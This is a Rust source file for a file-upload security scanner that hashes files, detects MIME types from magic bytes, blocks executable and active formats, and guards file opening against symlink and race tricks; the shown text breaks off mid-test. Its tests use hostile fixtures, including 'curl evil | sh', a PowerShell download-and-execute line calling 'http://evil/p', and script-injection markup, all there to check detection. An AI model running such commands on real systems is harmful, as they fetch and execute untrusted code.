//! Streaming SHA-256 calculator and binary magic-byte MIME inspector.

use std::path::Path;

use async_trait::async_trait;
use sha2::{Digest, Sha256};
use tokio::fs::{self, File};
use tokio::io::AsyncReadExt;

use crate::domain::entities::{FileArtifact, SecurityVerdict};
use crate::domain::errors::DomainError;
use crate::domain::path_policy::{reject_forbidden_system_dir, sanitize_file_name};
use crate::domain::ports::{FileScanner, HashCalculator, MimeValidator};

/// Fixed 64 KB chunk size for streaming file I/O to keep RAM usage constant regardless of file size.
pub const STREAM_CHUNK_SIZE: usize = 65_536;

/// Maximum leading header bytes inspected for binary magic-byte detection (8 KB).
const MAGIC_HEADER_MAX_BYTES: usize = 8_192;

/// Synthetic MIME reported when a blocked executable/script extension lacks binary magic bytes.
const FALLBACK_EXECUTABLE_EXTENSION_MIME: &str = "application/x-executable-extension";

const DANGEROUS_EXECUTABLE_MIMES: &[&str] = &[
    "application/x-executable",
    "application/x-sharedlib",
    "application/vnd.microsoft.portable-executable",
    "application/x-msdownload",
    "application/x-mach-binary",
    "application/x-elf",
    "application/x-shellscript",
    "text/x-shellscript",
    "application/x-sh",
    "application/x-dosexec",
    "application/wasm",
    "application/java",
    "application/java-archive",
    "application/vnd.android.package-archive",
    "application/vnd.android.dex",
    "application/x-msi",
    "application/x-ms-shortcut",
    "application/x-shockwave-flash",
    "application/vnd.debian.binary-package",
    "application/x-rpm",
    "application/x-google-chrome-extension",
    "application/x-python",
    "text/x-python",
    "application/javascript",
    "text/javascript",
    "text/html",
    "image/svg+xml",
];

#[derive(Debug, Clone, Copy)]
enum ExtensionPolicy {
    PlainText(&'static [&'static str]),
    BinaryMagic(&'static [&'static str]),
    BlockedExecutableOrActive,
}

const EXTENSION_POLICIES: &[(&[&str], ExtensionPolicy)] = &[
    (
        &[
            "exe", "dll", "sys", "scr", "com", "pif", "cpl", "ocx", "msi", "msp", "elf", "so",
            "bin", "run", "appimage", "sh", "bash", "zsh", "ksh", "csh", "bat", "cmd", "ps1",
            "psm1", "psd1", "vbs", "vbe", "js", "mjs", "cjs", "jse", "wsf", "hta", "py", "pyw",
            "rb", "pl", "php", "jar", "war", "ear", "apk", "ipa", "wasm", "class", "dex", "deb",
            "rpm", "crx", "swf", "lnk", "html", "htm", "xhtml", "svg",
        ],
        ExtensionPolicy::BlockedExecutableOrActive,
    ),
    (&["txt", "log"], ExtensionPolicy::PlainText(&["text/plain"])),
    (
        &["md"],
        ExtensionPolicy::PlainText(&["text/plain", "text/markdown"]),
    ),
    (
        &["csv"],
        ExtensionPolicy::PlainText(&["text/plain", "text/csv"]),
    ),
    (
        &["json"],
        ExtensionPolicy::PlainText(&["text/plain", "application/json", "text/json"]),
    ),
    (
        &["yaml", "yml"],
        ExtensionPolicy::PlainText(&[
            "text/plain",
            "text/yaml",
            "application/yaml",
            "application/x-yaml",
            "text/x-yaml",
        ]),
    ),
    (
        &["toml"],
        ExtensionPolicy::PlainText(&["text/plain", "application/toml", "text/toml", "text/x-toml"]),
    ),
    (&["pdf"], ExtensionPolicy::BinaryMagic(&["application/pdf"])),
    (
        &["jpg", "jpeg"],
        ExtensionPolicy::BinaryMagic(&["image/jpeg"]),
    ),
    (&["png"], ExtensionPolicy::BinaryMagic(&["image/png"])),
    (&["gif"], ExtensionPolicy::BinaryMagic(&["image/gif"])),
    (&["webp"], ExtensionPolicy::BinaryMagic(&["image/webp"])),
    (&["mp4"], ExtensionPolicy::BinaryMagic(&["video/mp4"])),
    (
        &["mkv"],
        ExtensionPolicy::BinaryMagic(&["video/x-matroska"]),
    ),
    (&["avi"], ExtensionPolicy::BinaryMagic(&["video/x-msvideo"])),
    (&["mp3"], ExtensionPolicy::BinaryMagic(&["audio/mpeg"])),
    (&["zip"], ExtensionPolicy::BinaryMagic(&["application/zip"])),
    (&["gz"], ExtensionPolicy::BinaryMagic(&["application/gzip"])),
    (
        &["tar"],
        ExtensionPolicy::BinaryMagic(&["application/x-tar"]),
    ),
    (
        &["7z"],
        ExtensionPolicy::BinaryMagic(&["application/x-7z-compressed"]),
    ),
    (
        &["rar"],
        ExtensionPolicy::BinaryMagic(&["application/vnd.rar"]),
    ),
    (
        &["iso"],
        ExtensionPolicy::BinaryMagic(&["application/x-iso9660-image"]),
    ),
    (
        &["docx"],
        ExtensionPolicy::BinaryMagic(&[
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "application/zip",
        ]),
    ),
    (
        &["xlsx"],
        ExtensionPolicy::BinaryMagic(&[
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "application/zip",
        ]),
    ),
    (
        &["pptx"],
        ExtensionPolicy::BinaryMagic(&[
            "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            "application/zip",
        ]),
    ),
];

/// Streaming SHA-256 calculator reading files in fixed 64 KB chunks.
#[derive(Debug, Default, Clone, Copy)]
pub struct StreamingHasher;

impl StreamingHasher {
    /// Creates a new [`StreamingHasher`] instance.
    pub fn new() -> Self {
        Self
    }
}

#[async_trait]
impl HashCalculator for StreamingHasher {
    async fn calculate_sha256(&self, path: &Path) -> Result<(String, u64), DomainError> {
        let mut file = open_regular_file_safely(path).await?;
        let mut buffer = vec![0u8; STREAM_CHUNK_SIZE];
        let mut hasher = Sha256::new();
        let mut total_bytes: u64 = 0;

        loop {
            let bytes_read = file.read(&mut buffer).await?;
            if bytes_read == 0 {
                break;
            }

            hasher.update(&buffer[..bytes_read]);
            let chunk_len = u64::try_from(bytes_read).map_err(|err| {
                DomainError::InspectionError(format!(
                    "Read chunk length exceeds u64 range while hashing {}: {err}",
                    path.display()
                ))
            })?;
            total_bytes = total_bytes.checked_add(chunk_len).ok_or_else(|| {
                DomainError::InspectionError(format!(
                    "File byte counter overflowed u64 while hashing {}",
                    path.display()
                ))
            })?;
        }

        Ok((hex::encode(hasher.finalize()), total_bytes))
    }
}

/// Binary magic-byte MIME detector and extension-vs-content spoofing scanner.
#[derive(Debug, Default, Clone, Copy)]
pub struct MagicBytesInspector;

impl MagicBytesInspector {
    /// Creates a new [`MagicBytesInspector`] instance.
    pub fn new() -> Self {
        Self
    }
}

#[async_trait]
impl MimeValidator for MagicBytesInspector {
    async fn detect_mime(&self, path: &Path) -> Result<Option<String>, DomainError> {
        let mut file = open_regular_file_safely(path).await?;
        let mut header = vec![0u8; MAGIC_HEADER_MAX_BYTES];
        let mut total_read: usize = 0;

        while total_read < MAGIC_HEADER_MAX_BYTES {
            let bytes_read = file.read(&mut header[total_read..]).await?;
            if bytes_read == 0 {
                break;
            }
            total_read += bytes_read;
        }

        if total_read == 0 {
            return Ok(None);
        }

        let header_slice = &header[..total_read];
        if let Some(kind) = infer::get(header_slice) {
            return Ok(Some(kind.mime_type().to_string()));
        }

        if let Some(exec_mime) = detect_executable_magic_fallback(header_slice) {
            return Ok(Some(exec_mime.to_string()));
        }

        if is_binary_or_invalid_utf8(header_slice) {
            return Ok(Some("application/octet-stream".to_string()));
        }

        Ok(None)
    }
}

#[async_trait]
impl FileScanner for MagicBytesInspector {
    fn name(&self) -> &'static str {
        "magic_bytes_inspector"
    }

    async fn scan(&self, artifact: &FileArtifact) -> Result<SecurityVerdict, DomainError> {
        if artifact.size_bytes == 0 {
            return Ok(SecurityVerdict::CorruptedOrUnreadable {
                reason: "empty file (0 bytes)".to_string(),
            });
        }

        let normalized_ext = artifact
            .extension
            .as_deref()
            .and_then(FileArtifact::normalize_extension_str);
        let expected_ext = normalized_ext.as_deref().unwrap_or("<none>");
        let detected_mime = artifact
            .detected_mime
            .as_deref()
            .map(str::trim)
            .filter(|mime| !mime.is_empty());

        if let Some(actual_mime) = detected_mime
            && is_dangerous_executable_mime(actual_mime)
        {
            return Ok(SecurityVerdict::MaliciousSpoofing {
                expected_ext: expected_ext.to_string(),
                actual_mime: actual_mime.to_string(),
            });
        }

        if let Some(ext) = normalized_ext.as_deref()
            && let Some(policy) = lookup_extension_policy(ext)
        {
            return Ok(evaluate_policy(policy, ext, expected_ext, detected_mime));
        }

        // Strict Zero-Trust for absent or unlisted extensions: allow only pure UTF-8 text (detected_mime == None).
        Ok(match detected_mime {
            Some(actual_mime) => SecurityVerdict::MaliciousSpoofing {
                expected_ext: expected_ext.to_string(),
                actual_mime: actual_mime.to_string(),
            },
            None => SecurityVerdict::Clean,
        })
    }
}

/// Opens `path` only if it is a safe, non-system regular non-symlink file and verifies identity to mitigate TOCTOU.
pub(crate) async fn open_regular_file_safely(path: &Path) -> Result<File, DomainError> {
    sanitize_file_name(path)?;
    reject_forbidden_system_dir(path)?;

    let link_meta = fs::symlink_metadata(path).await?;
    if link_meta.file_type().is_symlink() {
        return Err(DomainError::PathTraversalAttempt(format!(
            "Symlinks are not permitted for inspection: {}",
            path.display()
        )));
    }
    if !link_meta.file_type().is_file() {
        return Err(DomainError::InvalidPath(format!(
            "Path is not a regular file: {}",
            path.display()
        )));
    }

    let canonical_path = fs::canonicalize(path).await?;
    reject_forbidden_system_dir(&canonical_path)?;

    let mut open_options = fs::OpenOptions::new();
    open_options.read(true);
    #[cfg(unix)]
    {
        open_options.custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK);
    }

    let file = open_options.open(path).await?;
    let file_meta = file.metadata().await?;
    if !file_meta.file_type().is_file() {
        return Err(DomainError::InvalidPath(format!(
            "Opened file handle is not a regular file: {}",
            path.display()
        )));
    }

    #[cfg(unix)]
    {
        let canonical_meta = fs::metadata(&canonical_path).await?;
        if !canonical_meta.file_type().is_file() {
            return Err(DomainError::InvalidPath(format!(
                "Canonical target is not a regular file: {}",
                canonical_path.display()
            )));
        }
        verify_unix_file_identity(path, &link_meta, &canonical_meta, &file_meta)?;
    }

    Ok(file)
}

#[cfg(unix)]
fn verify_unix_file_identity(
    path: &Path,
    link_meta: &std::fs::Metadata,
    canonical_meta: &std::fs::Metadata,
    file_meta: &std::fs::Metadata,
) -> Result<(), DomainError> {
    use std::os::unix::fs::MetadataExt;

    let link_id = (link_meta.dev(), link_meta.ino());
    let canonical_id = (canonical_meta.dev(), canonical_meta.ino());
    let file_id = (file_meta.dev(), file_meta.ino());

    if link_id != canonical_id || link_id != file_id {
        return Err(DomainError::PathTraversalAttempt(format!(
            "File identity changed between metadata inspection and open (TOCTOU): {}",
            path.display()
        )));
    }
    Ok(())
}

fn detect_executable_magic_fallback(header: &[u8]) -> Option<&'static str> {
    if header.starts_with(b"\x7fELF") {
        return Some("application/x-executable");
    }
    if header.starts_with(b"MZ") {
        return Some("application/vnd.microsoft.portable-executable");
    }
    let after_bom = header.strip_prefix(b"\xEF\xBB\xBF").unwrap_or(header);
    if after_bom.starts_with(b"#!") {
        return Some("text/x-shellscript");
    }
    None
}

fn is_binary_or_invalid_utf8(header: &[u8]) -> bool {
    header.contains(&0)
        || matches!(std::str::from_utf8(header), Err(err) if err.error_len().is_some())
}

fn is_dangerous_executable_mime(mime: &str) -> bool {
    DANGEROUS_EXECUTABLE_MIMES
        .iter()
        .any(|dangerous| mime.eq_ignore_ascii_case(dangerous))
}

fn lookup_extension_policy(ext: &str) -> Option<ExtensionPolicy> {
    EXTENSION_POLICIES
        .iter()
        .find(|(extensions, _)| extensions.contains(&ext))
        .map(|(_, policy)| *policy)
}

fn evaluate_policy(
    policy: ExtensionPolicy,
    ext: &str,
    expected_ext: &str,
    detected_mime: Option<&str>,
) -> SecurityVerdict {
    match policy {
        ExtensionPolicy::BlockedExecutableOrActive => SecurityVerdict::MaliciousSpoofing {
            expected_ext: expected_ext.to_string(),
            actual_mime: detected_mime
                .unwrap_or(FALLBACK_EXECUTABLE_EXTENSION_MIME)
                .to_string(),
        },
        ExtensionPolicy::PlainText(allowed_mimes) => match detected_mime {
            Some(actual_mime) => check_allowed_mime(expected_ext, actual_mime, allowed_mimes),
            None => SecurityVerdict::Clean,
        },
        ExtensionPolicy::BinaryMagic(allowed_mimes) => match detected_mime {
            Some(actual_mime) => check_allowed_mime(expected_ext, actual_mime, allowed_mimes),
            None => SecurityVerdict::CorruptedOrUnreadable {
                reason: format!("missing or invalid magic bytes for .{ext}"),
            },
        },
    }
}

fn check_allowed_mime(
    expected_ext: &str,
    actual_mime: &str,
    allowed_mimes: &[&str],
) -> SecurityVerdict {
    if allowed_mimes
        .iter()
        .any(|allowed| actual_mime.eq_ignore_ascii_case(allowed))
    {
        SecurityVerdict::Clean
    } else {
        SecurityVerdict::MaliciousSpoofing {
            expected_ext: expected_ext.to_string(),
            actual_mime: actual_mime.to_string(),
        }
    }
}

#[cfg(test)]
mod tests {
    use std::io::Write;
    use std::path::PathBuf;

    use sha2::{Digest, Sha256};
    use tempfile::tempdir;

    use super::*;

    fn make_artifact(
        name: &str,
        extension: Option<&str>,
        size_bytes: u64,
        detected_mime: Option<&str>,
    ) -> FileArtifact {
        FileArtifact {
            path: PathBuf::from(format!("/quarantine/{name}")),
            sanitized_name: name.to_string(),
            extension: extension.map(ToString::to_string),
            size_bytes,
            sha256_hash: "0".repeat(64),
            detected_mime: detected_mime.map(ToString::to_string),
        }
    }

    #[tokio::test]
    async fn streaming_hasher_handles_empty_small_and_multi_chunk_files() {
        let dir = tempdir().expect("tempdir");
        let hasher = StreamingHasher::new();

        // Empty file (0 bytes)
        let empty_path = dir.path().join("empty.bin");
        std::fs::write(&empty_path, b"").expect("write empty");
        let (empty_hash, empty_size) = hasher
            .calculate_sha256(&empty_path)
            .await
            .expect("hash empty file");
        assert_eq!(empty_size, 0);
        assert_eq!(
            empty_hash,
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );

        // Small (< 64 KB), exact 64 KB boundary, ~200 KB non-multiple, and exact 256 KB
        let size_cases = [
            ("small_512b.bin", 512usize),
            ("exact_64kb_minus_1.bin", STREAM_CHUNK_SIZE - 1),
            ("exact_64kb.bin", STREAM_CHUNK_SIZE),
            ("exact_64kb_plus_1.bin", STREAM_CHUNK_SIZE + 1),
            ("approx_200kb.bin", 200 * 1024 + 333),
            ("multi_chunk_193kb.bin", STREAM_CHUNK_SIZE * 3 + 1_234),
            ("exact_256kb.bin", 256 * 1024),
        ];

        for (file_name, total_len) in size_cases {
            let file_path = dir.path().join(file_name);
            let payload: Vec<u8> = (0..total_len)
                .map(|i| ((i.wrapping_mul(37) ^ (i >> 8)) % 251) as u8)
                .collect();
            std::fs::write(&file_path, &payload).expect("write payload");

            let expected_digest = hex::encode(Sha256::digest(&payload));
            let (actual_hash, actual_size) = hasher
                .calculate_sha256(&file_path)
                .await
                .expect("hash file");

            assert_eq!(
                actual_size, total_len as u64,
                "size mismatch for {file_name}"
            );
            assert_eq!(
                actual_hash, expected_digest,
                "hash mismatch for {file_name}"
            );
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn streaming_hasher_and_magic_inspector_reject_symlinks() {
        let dir = tempdir().expect("tempdir");
        let target = dir.path().join("real.txt");
        std::fs::write(&target, b"safe content").expect("write target");

        let sub_dir = dir.path().join("nested_dir");
        std::fs::create_dir_all(&sub_dir).expect("create nested dir");

        let file_symlink = dir.path().join("link_to_file.txt");
        std::os::unix::fs::symlink(&target, &file_symlink).expect("create file symlink");

        let dangling_symlink = dir.path().join("dangling_link.pdf");
        std::os::unix::fs::symlink(dir.path().join("missing_target.pdf"), &dangling_symlink)
            .expect("create dangling symlink");

        let dir_symlink = dir.path().join("link_to_dir");
        std::os::unix::fs::symlink(&sub_dir, &dir_symlink).expect("create dir symlink");

        let hasher = StreamingHasher::new();
        let inspector = MagicBytesInspector::new();

        for symlink_path in [file_symlink, dangling_symlink, dir_symlink] {
            let hash_err = hasher
                .calculate_sha256(&symlink_path)
                .await
                .expect_err("symlink must be rejected by StreamingHasher");
            assert!(
                matches!(hash_err, DomainError::PathTraversalAttempt(_)),
                "expected PathTraversalAttempt from StreamingHasher for {}, got {hash_err:?}",
                symlink_path.display()
            );

            let mime_err = inspector
                .detect_mime(&symlink_path)
                .await
                .expect_err("symlink must be rejected by MagicBytesInspector");
            assert!(
                matches!(mime_err, DomainError::PathTraversalAttempt(_)),
                "expected PathTraversalAttempt from MagicBytesInspector for {}, got {mime_err:?}",
                symlink_path.display()
            );
        }
    }

    #[tokio::test]
    async fn open_regular_file_safely_rejects_directories_null_bytes_and_missing_files() {
        let dir = tempdir().expect("tempdir");
        let hasher = StreamingHasher::new();
        let inspector = MagicBytesInspector::new();

        let dir_err = hasher
            .calculate_sha256(dir.path())
            .await
            .expect_err("directory must be rejected");
        assert!(matches!(dir_err, DomainError::InvalidPath(_)));

        let mime_dir_err = inspector
            .detect_mime(dir.path())
            .await
            .expect_err("directory must be rejected by detect_mime");
        assert!(matches!(mime_dir_err, DomainError::InvalidPath(_)));

        let null_path = Path::new("/tmp/bad\0file.pdf");
        let hash_null_err = hasher
            .calculate_sha256(null_path)
            .await
            .expect_err("null byte path must be rejected by StreamingHasher");
        assert!(matches!(
            hash_null_err,
            DomainError::PathTraversalAttempt(_)
        ));

        let mime_null_err = inspector
            .detect_mime(null_path)
            .await
            .expect_err("null byte path must be rejected by MagicBytesInspector");
        assert!(matches!(
            mime_null_err,
            DomainError::PathTraversalAttempt(_)
        ));

        let missing_path = dir.path().join("does_not_exist.pdf");
        let missing_err = hasher
            .calculate_sha256(&missing_path)
            .await
            .expect_err("missing file must fail");
        assert!(matches!(missing_err, DomainError::IoError(_)));
    }

    #[tokio::test]
    async fn end_to_end_inspector_classifies_real_headers_spoofing_empty_and_corrupted_files() {
        let dir = tempdir().expect("tempdir");
        let hasher = StreamingHasher::new();
        let inspector = MagicBytesInspector::new();

        async fn inspect_temp_file(
            hasher: &StreamingHasher,
            inspector: &MagicBytesInspector,
            path: &Path,
        ) -> (FileArtifact, SecurityVerdict) {
            let (sha256_hash, size_bytes) =
                hasher.calculate_sha256(path).await.expect("hash temp file");
            let detected_mime = inspector.detect_mime(path).await.expect("detect mime");
            let sanitized_name = path
                .file_name()
                .and_then(|n| n.to_str())
                .expect("utf8 file name")
                .to_string();
            let extension = FileArtifact::normalize_extension(path);
            let artifact = FileArtifact {
                path: path.to_path_buf(),
                sanitized_name,
                extension,
                size_bytes,
                sha256_hash,
                detected_mime,
            };
            let verdict = inspector.scan(&artifact).await.expect("scan artifact");
            (artifact, verdict)
        }

        // 1. Valid PDF 1.5 with .pdf extension -> Clean
        let valid_pdf = dir.path().join("report_1_5.pdf");
        std::fs::write(
            &valid_pdf,
            b"%PDF-1.5\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF\n",
        )
        .expect("write pdf 1.5");
        let (pdf_artifact, pdf_verdict) = inspect_temp_file(&hasher, &inspector, &valid_pdf).await;
        assert_eq!(
            pdf_artifact.detected_mime.as_deref(),
            Some("application/pdf")
        );
        assert_eq!(pdf_verdict, SecurityVerdict::Clean);

        // 2. Spoofed ELF [0x7F, 0x45, 0x4C, 0x46, ...] (ET_EXEC and ET_DYN) disguised as .pdf -> MaliciousSpoofing
        let spoofed_elf_pdf = dir.path().join("invoice_elf.pdf");
        let mut elf_bytes = vec![0u8; 64];
        elf_bytes[..8].copy_from_slice(&[0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00]);
        elf_bytes[16] = 0x02; // ET_EXEC
        std::fs::write(&spoofed_elf_pdf, &elf_bytes).expect("write spoofed elf pdf");
        let (_, elf_verdict) = inspect_temp_file(&hasher, &inspector, &spoofed_elf_pdf).await;
        assert_eq!(
            elf_verdict,
            SecurityVerdict::MaliciousSpoofing {
                expected_ext: "pdf".to_string(),
                actual_mime: "application/x-executable".to_string(),
            }
        );

        let spoofed_pie_pdf = dir.path().join("invoice_pie.pdf");
        let mut pie_bytes = vec![0u8; 64];
        pie_bytes[..8].copy_from_slice(&[0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00]);
        pie_bytes[16] = 0x03; // ET_DYN (PIE / shared object)
        std::fs::write(&spoofed_pie_pdf, &pie_bytes).expect("write spoofed pie pdf");
        let (_, pie_verdict) = inspect_temp_file(&hasher, &inspector, &spoofed_pie_pdf).await;
        assert!(matches!(
            pie_verdict,
            SecurityVerdict::MaliciousSpoofing {
                ref expected_ext,
                ..
            } if expected_ext == "pdf"
        ));

        // 3. Spoofed PE/EXE [0x4D, 0x5A, ...] disguised as .jpg -> MaliciousSpoofing
        let spoofed_pe_jpg = dir.path().join("photo_pe.jpg");
        let mut pe_bytes = vec![0u8; 128];
        pe_bytes[..4].copy_from_slice(&[0x4D, 0x5A, 0x90, 0x00]);
        std::fs::write(&spoofed_pe_jpg, &pe_bytes).expect("write spoofed pe jpg");
        let (_, pe_verdict) = inspect_temp_file(&hasher, &inspector, &spoofed_pe_jpg).await;
        assert_eq!(
            pe_verdict,
            SecurityVerdict::MaliciousSpoofing {
                expected_ext: "jpg".to_string(),
                actual_mime: "application/vnd.microsoft.portable-executable".to_string(),
            }
        );

        // 4. Executable shebang script disguised as .txt AND .pdf -> MaliciousSpoofing
        for ext in ["txt", "pdf"] {
            let shebang_path = dir.path().join(format!("payload.{ext}"));
            std::fs::write(&shebang_path, b"#!/bin/sh\nid\nrm -rf /tmp/test\n")
                .expect("write shebang");
            let (_, shebang_verdict) = inspect_temp_file(&hasher, &inspector, &shebang_path).await;
            assert_eq!(
                shebang_verdict,
                SecurityVerdict::MaliciousSpoofing {
                    expected_ext: ext.to_string(),
                    actual_mime: "text/x-shellscript".to_string(),
                }
            );
        }

        // 5. Empty files (0 bytes) -> CorruptedOrUnreadable
        for empty_name in ["zero.pdf", "zero.txt"] {
            let empty_path = dir.path().join(empty_name);
            std::fs::write(&empty_path, b"").expect("write empty");
            let (empty_artifact, empty_verdict) =
                inspect_temp_file(&hasher, &inspector, &empty_path).await;
            assert_eq!(empty_artifact.size_bytes, 0);
            assert_eq!(empty_artifact.detected_mime, None);
            assert_eq!(
                empty_verdict,
                SecurityVerdict::CorruptedOrUnreadable {
                    reason: "empty file (0 bytes)".to_string(),
                }
            );
        }

        // 6. Valid plain .txt -> Clean
        let valid_txt = dir.path().join("plain_notes.txt");
        std::fs::write(
            &valid_txt,
            "Relatório técnico com acentuação UTF-8: ação, último, número.\n".as_bytes(),
        )
        .expect("write valid txt");
        let (txt_artifact, txt_verdict) = inspect_temp_file(&hasher, &inspector, &valid_txt).await;
        assert_eq!(txt_artifact.detected_mime, None);
        assert_eq!(txt_verdict, SecurityVerdict::Clean);

        // 7. Corrupted .pdf without valid magic header (UTF-8 text) -> CorruptedOrUnreadable
        let corrupted_text_pdf = dir.path().join("corrupted_text.pdf");
        std::fs::write(
            &corrupted_text_pdf,
            b"corrupted-pdf-without-valid-magic-header",
        )
        .expect("write corrupted text pdf");
        let (corrupted_artifact, corrupted_verdict) =
            inspect_temp_file(&hasher, &inspector, &corrupted_text_pdf).await;
        assert_eq!(corrupted_artifact.detected_mime, None);
        assert_eq!(
            corrupted_verdict,
            SecurityVerdict::CorruptedOrUnreadable {
                reason: "missing or invalid magic bytes for .pdf".to_string(),
            }
        );

        // 7b. Arbitrary binary / NUL / invalid UTF-8 payload disguised as .txt and .pdf -> application/octet-stream -> MaliciousSpoofing
        for ext in ["txt", "pdf"] {
            let binary_payload = dir.path().join(format!("binary_payload.{ext}"));
            std::fs::write(
                &binary_payload,
                b"\x9f\x12\xab\x44binary-payload-with-nul\x00\xff\x13\x37",
            )
            .expect("write binary payload");
            let (bin_artifact, bin_verdict) =
                inspect_temp_file(&hasher, &inspector, &binary_payload).await;
            assert_eq!(
                bin_artifact.detected_mime.as_deref(),
                Some("application/octet-stream")
            );
            assert_eq!(
                bin_verdict,
                SecurityVerdict::MaliciousSpoofing {
                    expected_ext: ext.to_string(),
                    actual_mime: "application/octet-stream".to_string(),
                }
            );
        }

        // 8. PDF bytes disguised as .txt -> MaliciousSpoofing
        let pdf_as_txt = dir.path().join("disguised.txt");
        std::fs::write(&pdf_as_txt, b"%PDF-1.5\n%spoofed\n").expect("write pdf as txt");
        let (_, spoofed_txt_verdict) = inspect_temp_file(&hasher, &inspector, &pdf_as_txt).await;
        assert_eq!(
            spoofed_txt_verdict,
            SecurityVerdict::MaliciousSpoofing {
                expected_ext: "txt".to_string(),
                actual_mime: "application/pdf".to_string(),
            }
        );

        // 9. Zero-Trust rejection of scripts without #! and dangerous active/executable formats
        let dangerous_real_files: &[(&str, &[u8], &str, &str)] = &[
            (
                "evil.sh",
                b"curl evil | sh\n",
                "sh",
                FALLBACK_EXECUTABLE_EXTENSION_MIME,
            ),
            (
                "payload.ps1",
                b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil/p')\n",
                "ps1",
                FALLBACK_EXECUTABLE_EXTENSION_MIME,
            ),
            (
                "dropper.exe",
                b"plain text dropper without MZ header\n",
                "exe",
                FALLBACK_EXECUTABLE_EXTENSION_MIME,
            ),
            (
                "page.html",
                b"<!DOCTYPE html><html><script>alert(1)</script></html>\n",
                "html",
                "text/html",
            ),
            (
                "raw_text.html",
                b"plain text disguised with html extension\n",
                "html",
                FALLBACK_EXECUTABLE_EXTENSION_MIME,
            ),
            (
                "vector.svg",
                b"<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>\n",
                "svg",
                FALLBACK_EXECUTABLE_EXTENSION_MIME,
            ),
            (
                "mod.wasm",
                b"\x00asm\x01\x00\x00\x00",
                "wasm",
                "application/wasm",
            ),
            (
                "app.jar",
                b"PK\x03\x04\x14\x00\x00\x00\x08\x00",
                "jar",
                "application/zip",
            ),
        ];

        for (file_name, bytes, expected_ext, expected_mime) in dangerous_real_files {
            let file_path = dir.path().join(file_name);
            std::fs::write(&file_path, bytes).expect("write dangerous file");
            let (_, verdict) = inspect_temp_file(&hasher, &inspector, &file_path).await;
            assert_eq!(
                verdict,
                SecurityVerdict::MaliciousSpoofing {
                    expected_ext: (*expected_ext).to_string(),
                    actual_mime: (*expected_mime).to_string(),
                },
                "unexpected verdict for dangerous file {file_name}"
            );
        }

        // 10. Binary / NUL / invalid UTF-8 payloads disguised as PlainText (.txt, .json) -> MaliciousSpoofing
        let valid_json = dir.path().join("valid.json");
        std::fs::write(
            &valid_json,
            "{\"status\":\"ok\",\"msg\":\"ação\"}\n".as_bytes(),
        )
        .expect("write valid json");
        let (_, json_verdict) = inspect_temp_file(&hasher, &inspector, &valid_json).await;
        assert_eq!(json_verdict, SecurityVerdict::Clean);

        for (name, bytes, expected_ext) in [
            ("nul_only.txt", b"hello\x00world".as_slice(), "txt"),
            ("invalid_utf8.txt", b"hello \xff\xfe\x80".as_slice(), "txt"),
            ("nul_only.json", b"{\"k\":\"v\x00\"}".as_slice(), "json"),
            (
                "invalid_utf8.json",
                b"{\"k\":\"\xff\xfe\"}".as_slice(),
                "json",
            ),
        ] {
            let file_path = dir.path().join(name);
            std::fs::write(&file_path, bytes).expect("write plaintext spoofing");
            let (artifact, verdict) = inspect_temp_file(&hasher, &inspector, &file_path).await;
            assert_eq!(
                artifact.detected_mime.as_deref(),
                Some("application/octet-stream"),
                "expected octet-stream for {name}"
            );
            assert_eq!(
                verdict,
                SecurityVerdict::MaliciousSpoofing {
                    expected_ext: expected_ext.to_string(),
                    actual_mime: "application/octet-stream".to_string(),
                }
            );
        }

        // 11. UTF-8 BOM + shebang in .txt and extensionless file -> MaliciousSpoofing
        for (name, expected_ext) in [("bom_script.txt", "txt"), ("bom_noext", "<none>")] {
            let bom_path = dir.path().join(name);
            std::fs::write(&bom_path, b"\xEF\xBB\xBF#!/bin/sh\nid\n").expect("write bom shebang");
            let (_, bom_verdict) = inspect_temp_file(&hasher, &inspector, &bom_path).await;
            assert_eq!(
                bom_verdict,
                SecurityVerdict::MaliciousSpoofing {
                    expected_ext: expected_ext.to_string(),
                    actual_mime: "text/x-shellscript".to_string(),
                }
            );
        }

        // 12. Extensionless & unknown (.custom) Zero-Trust: UTF-8 README -> Clean; binary content -> MaliciousSpoofing
        let readme = dir.path().join("README");
        std::fs::write(
            &readme,
            "Documentação em UTF-8 puro: ação e revisão.\n".as_bytes(),
        )
        .expect("write README");
        let (readme_artifact, readme_verdict) =
            inspect_temp_file(&hasher, &inspector, &readme).await;
        assert_eq!(readme_artifact.extension, None);
        assert_eq!(readme_artifact.detected_mime, None);
        assert_eq!(readme_verdict, SecurityVerdict::Clean);

        let noext_bin = dir.path().join("noext_bin");
        std::fs::write(&noext_bin, b"\x00\x90\x90\xff\xfe").expect("write noext_bin");
        let (_, noext_bin_verdict) = inspect_temp_file(&hasher, &inspector, &noext_bin).await;
        assert_eq!(
            noext_bin_verdict,
            SecurityVerdict::MaliciousSpoofing {
                expected_ext: "<none>".to_string(),
                actual_mime: "application/octet-stream".to_string(),
            }
        );

        let custom_bin = dir.path().join("blob.custom");
        std::fs::write(&custom_bin, b"%PDF-1.5\n%hidden pdf\n").expect("write custom bin");
        let (_, custom_bin_verdict) = inspect_temp_file(&hasher, &inspector, &custom_bin).await;
        assert_eq!(
            custom_bin_verdict,
            SecurityVerdict::MaliciousSpoofing {
                expected_ext: "custom".to_string(),
                actual_mime: "application/pdf".to_string(),
            }
        );

        let custom_utf8 = dir.path().join("notes.custom");
        std::fs::write(&custom_utf8, b"plain UTF-8 in unknown extension\n")
            .expect("write custom utf8");
        let (_, custom_utf8_verdict) = inspect_temp_file(&hasher, &inspector, &custom_utf8).await;
        assert_eq!(custom_utf8_verdict, SecurityVerdict::Clean);
    }

    #[tokio::test]
    async fn mime_validator_detects_known_headers_and_executable_fallbacks() {
        let dir = tempdir().expect("tempdir");
        let inspector = MagicBytesInspector::new();

        // Empty file -> None
        let empty = dir.path().join("empty.txt");
        std::fs::write(&empty, b"").expect("write empty");
        assert_eq!(inspector.detect_mime(&empty).await.expect("empty"), None);

        // Plain text -> None
        let plain = dir.path().join("notes.txt");
